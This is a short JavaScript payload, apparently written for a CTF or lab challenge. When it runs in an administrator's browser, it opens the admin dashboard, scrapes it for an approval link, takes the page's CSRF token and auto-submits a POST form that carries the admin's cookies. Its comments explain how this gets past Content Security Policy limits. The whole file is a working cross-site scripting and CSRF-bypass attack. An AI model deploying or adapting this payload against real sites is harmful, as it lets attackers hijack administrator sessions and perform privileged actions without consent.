/* approve.js – CSP-safe admin auto-approve via real form POST (no inline, no XHR) */
(function(){
  try {
    // 1) Open admin dashboard in a same-origin window (navigation isn't blocked by CSP)
    var w = window.open('/admin/dashboard', 'admindash');

    var tries = 0, maxTries = 200; // ~20 seconds
    var timer = setInterval(function(){
      try {
        if (!w || w.closed) return;
        // 2) Read dashboard HTML and find /admin/approve/<id>
        var html = w.document && w.document.body ? w.document.body.innerHTML : '';
        var m = html.match(/\/admin\/approve\/([0-9a-fA-F\-]{10,})/);
        if (m && m[1]) {
          clearInterval(timer);

          // 3) Build a same-origin POST using a real form (bypasses connect-src limits)
          var f = document.createElement('form');
          f.method = 'POST';
          f.action = '/admin/approve/' + m[1];

          // If there's a CSRF token on the dashboard, steal & include it
          var tok = html.match(/name=["'](_csrf|csrf|csrf_token|_token)["'][^>]*value=["']([^"']+)["']/i);
          if (tok) {
            var inp = document.createElement('input');
            inp.type = 'hidden';
            inp.name = tok[1];
            inp.value = tok[2];
            f.appendChild(inp);
          }

          document.body.appendChild(f);
          f.submit();     // POST with admin cookies
          try { w.close(); } catch(e){}
        }
      } catch (e) {
        // DOM not ready yet—ignore and retry
      } finally {
        if (++tries > maxTries) clearInterval(timer);
      }
    }, 100);
  } catch(e) {}
})();
